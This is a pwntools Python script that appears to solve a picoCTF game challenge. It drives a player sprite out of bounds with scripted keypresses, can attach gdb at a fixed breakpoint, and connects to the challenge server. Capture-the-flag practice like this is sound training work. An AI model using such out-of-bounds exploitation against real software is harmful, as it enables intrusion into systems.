from pwn import *

exe = ELF("./game_patched")


context.arch = 'x86'


REMOTE = False
DEBUG = False
LOG = True
def conn():
    global REMOTE
    global DEBUG
    global LOG
    
    if 'R' in args:
        REMOTE = True
        return remote(f'saturn.picoctf.net', 62733)
    
    
    r = process(exe.path)
    if 'D' in args:
        DEBUG = True
        gdb.attach(r, '''
                    
                    # b solve_round
                    # b move_player
                    b * 0x8049846
                    # x/20wx &player_tile
                    c
                       ''')
    return r

def move_left(r):
    r.sendline(b'a')

def move_right(r):
    r.sendline(b'd')
def move_up(r):
    r.sendline(b'w')
def move_down(r):
    r.sendline(b's')
    
def change_tile(r, tile):
    r.send(b'\x6c')
    r.send(tile)


def main():
    global LOG
    
    r = conn()
    if DEBUG:
        print("waiting for debugger")
        sleep(1)
    for i in range(4):
        move_up(r)
        move_left(r)
    
    for i in range(4):
        move_left(r)  
    for i in range(4):
        move_right(r)  
      
    r.sendline(b'p')  

    r.interactive()


if __name__ == "__main__":
    main()
